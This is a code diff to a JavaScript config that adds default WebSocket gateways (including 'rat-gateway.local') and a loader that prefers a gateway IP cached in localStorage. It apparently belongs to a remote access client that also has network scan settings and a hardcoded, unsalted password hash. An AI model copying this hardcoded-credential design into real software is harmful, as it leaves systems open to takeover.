@@ -2,6 +2,14 @@ export const CONFIG = {
     SERVER_PORT: 8080,
     AUTH_HASH: "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
     LOCAL_STORAGE_ID_KEY: 'client_machine_id',
+    LOCAL_STORAGE_GATEWAY_KEY: 'gateway_ip',
+
+    DEFAULT_GATEWAYS: [
+        {ip: 'rat-gateway.local', port: 8080, protocol: 'wss'},
+        {ip: 'rat-gateway.local', port: 8082, protocol: 'ws'},
+        {ip: 'localhost', port: 8080, protocol: 'wss'},
+        {ip: 'localhost', port: 8082, protocol: 'ws'}
+    ],
 
     CMD: {
         PING: "ping",
@@ -40,3 +48,17 @@ export const CONFIG = {
     SCAN_TIMEOUT: 1500,
     SCAN_BATCH_SIZE: 30
 };
+
+export function loadDefaultGateways() {
+    const gateways = [...CONFIG.DEFAULT_GATEWAYS];
+    
+    const cachedIp = localStorage.getItem(CONFIG.LOCAL_STORAGE_GATEWAY_KEY);
+    if (cachedIp && cachedIp !== 'localhost' && cachedIp !== 'rat-gateway.local') {
+        gateways.unshift(
+            {ip: cachedIp, port: 8080, protocol: 'wss'},
+            {ip: cachedIp, port: 8082, protocol: 'ws'}
+        );
+    }
+    
+    return gateways;
+}
